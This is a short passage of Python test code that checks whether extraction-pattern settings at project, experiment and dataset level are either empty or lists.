        assert project_extraction_patterns is None or isinstance(project_extraction_patterns, list)
        
        # Experiment-level patterns should be consistent
        for exp_name, patterns in experiment_extraction_results.items():
            assert patterns is None or isinstance(patterns, list)
        
        # Dataset-level patterns should be consistent
        for dataset_name, patterns in dataset_extraction_results.items():
            assert patterns is None or isinstance(patterns, list)